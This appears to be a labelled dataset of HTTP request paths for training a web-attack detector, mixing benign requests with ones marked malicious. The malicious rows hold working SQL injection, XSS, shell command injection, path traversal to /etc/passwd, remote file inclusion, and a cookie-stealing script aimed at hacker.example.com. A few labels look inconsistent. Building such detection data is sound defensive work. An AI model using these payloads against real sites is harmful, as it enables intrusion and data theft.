request	label
/ javascript / disclaimer . svn-base 	0
/ string / str =  $  ( echo brbpjx )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ javascript / hits . zip 	0
/ string / strings / parameters = 68266885x 	0
/ phpmyadmin / index . php ? cat_select =  < script > foo <  / script > 	1
/ string / modo = entrar & login = odelia & pwd = mastelero & remember = off & b1 = entrar 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo zwbbrm )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | "	1
"/ top . php ? stuff =  ""  \ x0ddel \ x09q29444369 \ x09 # "	1
/ moneymakers / 	0
"/ string / errormsg =  <  !  --  # include + file =  "" archivo_secreto ""  +  --  > "	1
/ javascript / iframe . class 	0
/ javascript / decode . conf 	0
/ fantomnews / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  ; select  ( case when  ( 4666 = 4666 )  then 1 else 4666 *  ( select 4666 from master .  . sysdatabases )  end )  -- "	1
/ string / strings / parameters = ven1no 	0
/ recordings / admin / configset . php ? settings_dir =  / etc / passwd \ x00 	1
/ help . php ? q =  '  & rm \ x09q42899831 \ x09 # 	1
/ string / modo = registro & login = tonkovic & password = 2ra71o1 & nombre = nicolo & apellidos = dopico + juanes & email = livermore-kozlowski @ hiteurope . ws & dni = 53527134q & direccion = del + almendro ,  + 169 ,  +  & ciudad = marines ,  + los & cp = 46960 & provincia = len & ntc = 5462359635999525 & b1 = registrar 	0
/ ieeesa_navhometype / 	0
/ homeir / 	0
/ cgi-bin / w04ukbv54ixz . inc 	0
/ javascript / clk . tgz 	0
/ string / strings / parameters = fregeneda ,  la 	0
/ workshop_programme / 	0
/ image1off / 	0
/ 83000776 / 	0
/ mylan-valium / 	0
"/ string / strings / parameters = 1 ""  ""  )  as hfvz where 7186 = 7186 union all select null , null , null , null , null , null # "	1
/ roommap / 	0
/ string / strings / parameters = 8480127021010451 	0
/ javascript / evt . ini 	0
/ string / strings / parameters = 1 '  )  )  and elt ( 4460 = 2665 , 2665 )  and  (  (  ' qmzu '  =  ' qmzu 	1
/ string / strings / parameters = barnett @ micaelagriga . mw 	0
/ javascript / accounting . nsf 	0
/ copying /  <  / p >  < body >  < script src = http :  /  / www . example . com / test ? rnd = q11971667 >  <  / script >  < p > 	1
/ yver8r9o . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 9209 	0
/ string / modo = registro & login = plouffe4 & password = 1er87n30689 & nombre = rhys & apellidos = labandn + tuto & email = otowa @ ebuy . com . ci & dni = 35866862h & direccion = calle + soria + 154 + 2a & ciudad = arce / artzi & cp = 09195 & provincia = granada & ntc = 2499149169058216 & b1 = registrar 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 4c + cd + 21 + 54 + 68 + 69 + 73 + 20 + 70 + 72 + 6f + 67 + 72 + 61 + 6d + 20 + 63 + 61 + 6e + 6e + 6f + 74 + 20 + 62 + 65 +  +  >  > esbq "	1
"/ string / strings / parameters = ""  |  | echo hugkzq $  (  ( 0 + 67 )  )  $  ( echo hugkzq ) hugkzq \ "	1
"/ en-us / 7o5qp766 . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ cuteftppro / 	0
/ news / scripts / news_page . php ? script_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ? 	1
/ 0x2e0x2e / 0x2e0x2e / 0x2e0x2e /  { file } 	1
/ 20061205_sonyvaio / 	0
/ string / strings / parameters = solter @ aclub . com . ke 	0
/ home_logobot / 	0
"/  ?  < script > document . cookie =  "" testrhbc = 8184 ;  ""  <  / script > "	1
"/ string / strings / parameters = '  ""  --  >  <  / style >  <  / script >  < script > shadowlabs ( 0x000045 )  <  / script > "	1
/ javascript / res . o 	0
"/ nmw0do67 . x ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ serwertestifies / 	0
/ roboform 6 / 	0
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testfutf = 1550 ""  > "	1
"/ top . php ? stuff =  ""  & ver \ x0b > q71858742 & rem \ x0b "	1
"/ string / strings / parameters = or 1 = 1 or  ""  ""  = "	1
/ 1888454084 / 	0
"/ string / strings / parameters = & lt ; style type =  \  "" text / javascript \  ""  & gt ; alert (  ' xss '  )  ;  & lt ;  / style & gt ; "	1
/ string / strings / parameters = ;  str =  $  ( echo iboovb )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ 043363 / 	0
/ javascript / lock . exe 	1
/ image0221164020411863 / 	0
/ string / strings / parameters = camio do monte 147 ,  10 ? h 	0
/ string / strings / parameters = 323 '   and    (   select    2937   from (   select     count (  *  )  ,   concat ( 0x3a6d70663a ,  (   select    mid (  (   ifnull (  cast (   database (  )    as       char   )  , 0x20 )  )  , 1 , 50 )  )  , 0x3a736e623a , floor ( rand ( 0 )  * 2 )  ) x    from    information_schema . character_sets    group     by    x ) a )   and    ' rmhn '  =  ' rmhn 	1
/ string / strings / parameters = silas 	0
/ 3dworm / 	0
/ string / strings / parameters = $ despumar 	0
"/  ? ilang = eng & sid = 2 ""  < script > alert ( 411776083444 )  ;  <  / script > "	1
/ 3032240 / 	0
/ tricky / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ cryptotoolkit / 	0
"/ ghswfouu . kspx ?  < script > document . cookie =  "" testsqmm = 5713 ;  ""  <  / script > "	1
/ tableofmalcontents / 	0
/ reduce_w / 	0
"/ examples / jsp / sessions / nessus ""  >  < script > alert (  ' mod_perl_status_uri_xss . nasl '  )  <  / script > "	1
/ q52251847 	0
/ string / modo = registro & login = maher & password = ca922839alo & nombre = indira & apellidos = ludeas + lopez & email = hessling @ mundoapple . kw & dni = 67332763x & direccion =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & ciudad = arroyomolinos & cp = 15076 & provincia = navarra & ntc = 8289412195885989 & b1 = registrar 	1
/ string / strings / parameters = fontbern maurici 	0
/ cgi-win / fileseek . cgi ? foot =  & head =  ; cat  / etc / passwd | 	1
/ string / strings / parameters = brigitte 	0
/ string / strings / parameters = 18417 	0
/ string / strings / parameters = 29579903v 	0
/ string / str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ netword_summ / 	0
/ 236218 / 	0
/ string / strings / parameters = 1 '  +  ( select  ' wyed '  where 9896 = 9896 ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  # 	1
/ bid construction project california / 	0
"/ string / strings / parameters = ;  str =  $  ( echo rppevg )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo ajewoj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ string / strings / parameters = -6370 '  )  )  as sims where 9388 = 9388 union all select 9388 , 9388 , 9388 , 9388 , 9388 , 9388 , 9388 , 9388 # 	1
"/ main . php ? logout =  ""  & ver \ xa0 > q18437972 & rem \ xa0 "	1
/ string / strings / parameters = < svg >  < doh onload = confirm ( 1 )  > 	1
/ freehaven-berk / 	0
"/ string / strings / parameters = 1 ""  ""  and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ""  "" zwov ""  ""  =  ""  "" zwov "	1
/ javascript / pwd . pfx 	0
/ string / strings / parameters = 1 '  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ' sloy '  =  ' sloy 	1
/ string / modo = entrar & login = alfi & pwd = 6ncanta33n & remember = on & b1 = entrar 	0
/ string / str =  $  ( echo srsafa )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ 252466 / 	0
"/ string / strings / parameters = |   [  2 -ne  $  ( echo rzsner  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / id = 1 & nombre = queso + manchego & precio = 100 & cantidad = 65 & b1 = aadir + al + carrito 	0
/ 152791 / 	0
/ azundris / 	0
/ forum1 . asp ? n = 1753 & amp ; nn =  / etc / passwd \ x00 	1
/ compact-off / 	0
"/ main . php ? stuff =  "" ping ; -w ; 9000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; "	1
/ upload . php ? save_path = xxpathxx ? 	1
/ qdlangde / 	0
/ bookimg / 	0
/ string / strings / parameters = stoevsky 	0
/ 040101jir / 	0
"/ top . php ? stuff =  "" rm q17133825  # "	1
/ string / strings / parameters = 1 '  +  ( select gkve where 1943 = 1943 waitfor delay  ' 0 : 0 : 5 '  )  +  ' 	1
/ 3ds_max / 	0
/ string / strings / parameters = &  & echo $ ifshrvany $  (  ( 38 + 49 )  )  $  ( echo $ ifshrvany ) hrvany ' 	1
/ serrin / 	0
/ brisco county jr / 	0
/ string / strings / parameters = 1 '  )  )  and sleep ( 5 )  and  (  (  ' krrr '  =  ' krrr 	1
/ string / strings / parameters = |   [  1 -ne  $  ( echo gqzijb  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ string / strings / parameters = 1 '  and 7756 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ' yvxg '  =  ' yvxg 	1
/ string / strings / parameters = -3436 )  or elt ( 1032 = 1032 , 3623 ) 	1
/ string / strings / parameters = rougerie @ cincocolores . sd 	0
/ v15040942 / 	0
"/ examples / jsp / jsp2 / el / nessus ""  >  < script > alert (  ' mod_perl_status_uri_xss . nasl '  )  <  / script > "	1
/ string / modo = registro & login = j *  ' ai & password = zullarse & nombre = jos + mara & apellidos = rodrigo + ambrs & email = leibman @ softstylestudio . be & dni = 90993097z & direccion = urbanizacion + residencial + ronda + 36 + 9 ? b & ciudad = riells + i + viabrea & cp = 42150 & provincia = teruel & ntc = 9974355200418178 & b1 = registrar 	1
/ phpmyadmin / scp . dll / sendto ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini \ x00gwextranet_template_dir_traversal . nasl 	1
/ string / modo = entrar & login = richey & pwd = sntoma & remember = on & b1 = entrar 	0
/ lib / functions . php ? doc_root = xxpathxx 	1
/ javascript / pfx . cnf 	0
/ string / modo = registro & login = wilkinso & password = chubasque4o & nombre = tideo & apellidos = bugnone & email = hartigan @ porqueagel . mc & dni = 54839907h & direccion = calle + san + braulio ,  + 198 +  & ciudad = longares & cp = 08440 & provinciaa = burgos & ntc = 3980165808897120 & b1 = registrar 	1
"/ help . php ? q =  ""  & uname \ x09 # "	1
/ cgi-915 / testcgi . exe 	1
/ javascript / yt . 7z 	0
/ string / modo = registro & login = purnell & password = 49pu + 22 & nombre = lavinia & apellidos = preisz & email = carslisle @ cirujanaplastica . ck & dni = 99142820dset-cookie :  + tamper = 1041264011025374727 & direccion = calle + santa + agueda + 162 + 5 ? c & ciudad = arroyo + del + ojanco & cp = 10893 & provincia = ciudad + real & ntc = 5833239568926901 & b1 = registrar 	1
/ string / strings / parameters = cribada 	0
/ 8131003 / 	0
/ javascript / broken . jsf 	0
/ string / strings / parameters = '  ; echo htpokc $  (  ( 39 + 32 )  )  $  ( echo htpokc ) htpokc 	1
/ magic bullet suite 1 / 	0
/ string / strings / parameters = scavran @ eonon . com . at 	0
/ string / strings / parameters = 1 )  )  as vzso where 8541 = 8541 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  -- 	1
/ string / strings / parameters = ollo 	0
/ string / modo = registro & login = youngman & password = a018699t0do & nombre = ibar & apellidos = bald + almansa & email = damboise @ automovilesalhambra . co & dni = 44906096e & direccion = calle + lima ,  + 50 + 9-d & ciudad = catadau & cp = 42066 & provincia = madrid & ntc =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & b1 = registrar 	1
/ javascript / feature . vb 	0
/ 4lockpicks / 	0
/ string / strings / parameters = passeig de monjo 102 ,  11 ? a 	0
/ examples / jsp / sessions / source ? v =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ rfcc-5059 / 	0
/ string / modo = entrar & login = kwokkin & pwd = i39str845vo & remember = on & b1 = entrar 	0
"/ en-us / esmozg5d . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ peter_gabriel / 	0
/ 127326 / 	0
/ string / strings / parameters = passeig torrent 10 ,  2f 	0
/ javascript / configs . cpp 	0
/ string / strings / parameters = lacasse 	0
/ accesspoint / 	0
/ string / strings / parameters = < embed / src =  /  / goo . gl / nlx0p > 	1
/ calendario / cal_insert . php ? classpath = xxpathxx 	1
"/ string / strings / parameters = 1 ""  ""  )  as yzny where 4869 = 4869 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  -- "	1
/ string / strings / parameters = '  |  | echo $ ifsbgabhn $  (  ( 68 + 69 )  )  $  ( echo $ ifsbgabhn ) bgabhn /  / 	1
/ mom-voyeur / 	0
/ string / strings / parameters = and 1 = 1 # 	1
"/ string / strings / parameters = < script > document . cookie =  "" testylik = 3403 ;  ""  <  / script > "	1
/ partneroffer_bag / 	0
/ string / modo = entrar & login = c ? hak-ho , n & pwd = es699601r & remember = on & b1 = entrar 	1
/ string / strings / parameters = 1 '  )  )  and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  ' dfxd '  like  ' dfxd 	1
/ 824538 / 	0
/ 1403-juno / 	0
/ 24cook / 	0
"/ main . php ? stuff =  ""  ; rm q18895618  # "	1
"/ string / modo = registro & login = crozier & password = aborrecimiento & nombre = ricardina & apellidos = burch + echaniz & email = hyer_longdon0 @ artforall . mc & dni = 62804007t ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  <  & direccion = plza .  + troyano + salaverry ,  + 42 ,  +  & ciudad = chvar & cp = 30500 & provincia = len & ntc = 1229899553268508 & b1 = registrar "	1
/ string / modo = entrar & login = trace & pwd = 2isp3n ? 3io43 & remember = on & b1 = entrar 	0
/ cgi-local / vssetcookie . exe 	1
/ string / modo = registro & login = kaluzny3 & password = 506ca & nombre = herodes & apellidos = buitrago + pontigo & email = chistiakov @ zytechwind . ke & dni = 87811832v & direccion = c /  + de + pedro + vidal + s / n ,  + 11d & ciudad = aana & cp = 18300 & provincia = huelva & ntc = 7024918540973284 & b1 = registrar 	0
/ rabbits_download / 	0
/ entdata / 	0
/ lookit / 	0
/ mimg-6tfn35 / 	0
/ string / strings / parameters = tra9sformable 	0
/ string / strings / parameters = odiosid-ad 	0
/ fjorton / 	0
/ betablockmodules / recenttagsmodule / recenttagsmodule . php ? path_prefix = xxpathxx 	1
/ index . php ? op = default & date = 200607 '  union select 1 , 1520713154 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = yuraj 	0
/ pic00007 / 	0
/ internet killed the video star / 	0
/ string / strings / parameters = 1 )  where 6090 = 6090 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
"/ manager / index . php ? mod_id = 2 & kb_ask =  <  / textarea >  < script > alert (  "" cerberus_support_center_mult_flaws . nasl ""  )  <  / script > "	1
"/ vac1l5vm . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ phish060825c / 	0
/ javascript / foundation . exe 	1
/ _vti_bin / _vti_adm / admin . exe 	1
"/ string / strings / parameters = 1 ""  ""  )  and 7533 = 7533 and  (  ""  "" yqzq ""  ""  =  ""  "" yqzq "	1
/ flower_type / 	0
"/ help . php ? q =  ""  | ping \ x09-w \ x0910000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 | rem \ x09 "	1
/ phpmyadmin / sawmill6cl . exe ? ho +  { complete_version } 	1
/ string / strings / parameters = echo vdkktu $  (  ( 48 + 39 )  )  $  ( echo vdkktu ) vdkktu ' 	1
/ javascript / toc . asmx 	0
/ 20050112 / 	0
/ search ? ns-query-pat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ projectbureau / 	0
/ cg_conduct / 	0
/ string / strings / parameters = 1 )  where 4780 = 4780 ; begin dbms_lock . sleep ( 5 )  ;  end -- 	1
/ 1153940441 / 	0
/ brollydish / 	0
/ choosing_major / 	0
"/ string / strings / parameters = -3234 %  ""  ""  )  )  or elt ( 1032 = 1032 , 3623 )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ towels-0 . 1 / src / scripture . php ? pageheaderfile = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ javascript / setup . tgz 	0
/ nieheader / 	0
/ index1288 / 	0
/ string / modo = insertar & precio = 6715 & b1 = confirmar / 	1
/ feldman_logo / 	0
/ digital-features / 	0
/ javascript / n . rar 	0
/ string / strings / parameters = -3361 '  |  |  ( select  ' msfi '  where 4806 = 4806 union all select 4806 , 4806 , 4806 , 4806 , 4806 , 4806 , 4806 , 4806 , 4806 -- 	1
/ metallica - whiskey in the jar / 	0
/ 113405 / 	0
"/ string / strings / parameters = <  !  --  up to opera 11 . 52 ,  ff 3 . 6 . 28  --  >  <  !  [  >  < img src =  ""  ]  >  < img src = x onerror = alert ( 1 )  /  /  ""  >  <  !  --  ie9 +  ,  ff4 +  ,  opera 11 . 60 +  ,  safari 4 . 0 . 4 +  ,  gc7 +    --  >  < svg >  <  !  [ cdata [  >  < image xlink : href =  ""  ]  ]  >  < img src = xx : x onerror = alert ( 2 )  /  /  ""  >  <  / svg > "	1
/ string / strings / parameters = koczian @ decoaching . is 	0
"/ string / strings / parameters = < style >  <  / style \ x0a < img src =  "" about : blank ""  onerror = javascript : alert ( 1 )  /  /  >  <  / style > "	1
/ string / strings / parameters = '   str =  $  ( echo fplfhr )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ string / strings / parameters = barkwill8 	0
/ help . php ? q = uname \ x09 > q28292329 \ x09 # 	1
"/ xlj7h65o . pl ?  < script > document . cookie =  "" testtbbe = 856 ;  ""  <  / script > "	1
/ techweb ' s rss feed / 	1
/ ci may2005 / 	0
/ string / strings / parameters = ;  str =  $  ( echo twchku )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ javascript / domain . pm 	0
/ affiliate_programs / 	0
/ string / strings / parameters = 06173 	0
/ string / strings / parameters = -3953 )  as wjjk where 6433 = 6433 or make_set ( 9354 = 9354 , 7185 )  -- 	1
/ string / modo = entrar & login = beique & pwd = carricar & remember = on & b1 = entrar 	0
/ 275954 / 	0
/ security-setups / 	0
/ 131483 / 	0
/ javascript / 2006 . exe 	1
/ 2609053 / 	0
/ cgi-bin / fileseek . cgi ? head =  & foot =  ; cat  / etc / passwd 	1
/ javascript / ma . cfm 	0
/ javascript / security . exe 	1
"/ string / strings / parameters = 1 ""  ""  )  or 1022 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- "	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  or 8514 = benchmark ( 5000000 , md5 ( 0x544d5a4c )  )  # "	1
/ automateit ! _information / 	0
/ javascript /  ~ bin . so 	0
/ bl8sefdm . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = -7635 ""  ""  union all select 1284 , 1284 , 1284 , 1284 , 1284 , 1284 # "	1
/ string / strings / parameters = 1 or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  #  vojr 	1
/ tasklist_b / 	0
/ string / strings / parameters = 2528 	0
/ string / modo = registro & login = hosang & password = helespontiaca & nombre = yodalia & apellidos = siruela + mohedano & emaila = hepburn_spinnell @ 17horas . sb & dni = 03749375f & direccion = antonio + ulloa + 98 + 3h & ciudad = entrena & cp = 50500 & provincia = badajoz & ntc = 8391447645133065 & b1 = registrar 	1
/ nav_volunteer / 	0
/ string / strings / parameters = a089ar 	0
/ 10789283 / 	0
/ javascript / pl . php3 	0
/ 000032268 / 	0
/ string / strings / parameters = $  { exec ( print (  ` echo yfvaoj ; echo  $  (  ( 71 + 65 )  )  ; echo yfvaoj ; echo yfvaoj `  )  ;  /  / yfvaoj 	1
/ string / strings / parameters = &  & echo bsqkbm $  (  ( 74 + 49 )  )  $  ( echo bsqkbm ) bsqkbm & 	1
/ index_de / 	0
/ ewidoantimalware / 	0
/ examples / jsp / num / common / visiteurs / include / menus . inc . php ? lvc_include_dir =  / etc / passwd \ x00 	1
/ string / str =  $  ( echo zdskke )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ cab_stamp / 	0
"/ examples / jsp / colors / forumdisplay . php ? fid = 21 ""  >  < script > x <  / script > "	1
/ examples / jsp / checkbox / core / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ frontend / x3 / htaccess / dohtaccess . html ? dir =  >  < script > alert ( 413035588065 )  <  / script > 	1
/ string / strings / parameters = boskova_busey @ piensoparaperros . qa 	0
/ string / strings / parameters = margheri 	0
/ string / strings / parameters = schumann @ mmo . com . bs 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' vpuh '  where 8164 = 8164 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  )  |  |  ' 	1
/ gorila / 	0
/ string / 123k29ykycxjz0nmq =  = 	1
/ icon_cal / 	0
/ string / strings / parameters = 1 '  )  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  (  ' peyy '  =  ' peyy 	1
/ 1256587569 / 	0
/ 1ked04eeb1fc_thumb / 	0
/ string / modo = insertar & precio = 8088 & b1 = pasar + por + caja 	0
/ hnpcfreeskypehandsets_1 / 	0
/ manual / fr / de 	0
/ string / strings / parameters = 1 %  '  )  procedure analyse ( extractvalue ( 9627 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x4b774c75 )  )  )  )  )  , 1 )  # 	1
/ mft06121436 / 	0
/ string / strings / parameters = 3283 	0
/ javascript / mp3s . tar . gz 	0
/ string / strings / parameters = -6217 )  )  as hyws where 3441 = 3441 or 9421 = 4695 # 	1
/ athena . php ? athena_dir = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ? 	0
/ string / strings / parameters = de asbaje abarzuza 	0
/ string / strings / parameters = pl .  juan xxiii 197 	0
/ weq93ppb . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ textuserid1 / 	0
/ string / modo = registro & login = ensminge & password = s3borrea & nombre = altaira & apellidos = tagle + isurieta & email = mellvig @ docerosas . sd & dni = 50932385n & direccion = plaza + movimiento + ciudadano ,  + 176 +  & ciudad = bollullos + de + la + mitacin & cp = 25597 & provincia = girona & ntc = 5738656777316429 & b1 = registrar 	0
"/ string / strings / parameters = 1 ""  ""  )  as obbk where 6414 = 6414 and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  -- "	1
/ 593472540 / 	0
"/ string / strings / parameters = 1 ""  ""  )  where 2312 = 2312 and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  -- "	1
/ string / modo = entrar & login = espuna & pwd = v8s684t29a & remember = off & b1 = entrar 	0
/ 1549542065_thumb1 / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 25 & b1 = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script > 	1
/ icttf-topicformat / 	0
/ 20040603-13 / 	0
/ u6834088 / 	0
/ javascript / debug . out 	0
"/ main . php ? logout =  "" del \ x0bq77294234 & rem \ x0b "	1
/ string / strings / parameters = < a href = ”http :  /  / www . google . com > clickme <  / a > 	1
/ main . php ? stuff =  & uname  > q43247564  # 	1
/ 21173626 / 	0
/ c80216-06_001 / 	0
/ string / strings / parameters = c /  almenas 98 5 ? f 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ghgvor )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  # 	1
/ string / strings / parameters = norean 	0
/ javascript / technology . exe 	1
/ string / strings / parameters = raudres 	0
/ button_web / 	0
/ li2005032402345 / 	0
/ javascript / _test . lst 	0
/ string / strings / parameters = throne @ familiamarino . cl 	0
"/ main . php ? stuff =  ""  ; uname  > q85142671  # "	1
/ poweredby_036 / 	0
/ getthecashyouneed / 	0
/ fantastic four v1 001-100 complete / 	0
/ ms365177 / 	0
/ 040293 / 	0
/ string / modo =  +  & login = mototsun & password = longitudinalmente & nombre = pedro & apellidos = berlingery & email = thrush_orhonsay6 @ aadsl . no & dni = 23532443q & direccion = c /  + polacas ,  + 59 + 1 ? f & ciudad = cubo + de + bureba & cp = 12170 & provincia = salamanca & ntc = 6489953845851590 & b1 = registrar 	1
/ 20040410-5 / 	0
/ string / strings / parameters = goddette 	0
/ string / modo = registro & login = jovo & password = 28l3ra8a & nombre = hebelen & apellidos = fornalino + grimaldi & email = ozaki_wanamaker @ travelzone . tel & dni = 75981771y & direccion = calle + san + juan + bautista + de + la + salle + 193 + 6 ? c & ciudad = calatorao & cp = 10191 & provincia = burgos & ntc = 3393638948319901 & b1 = registrar '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
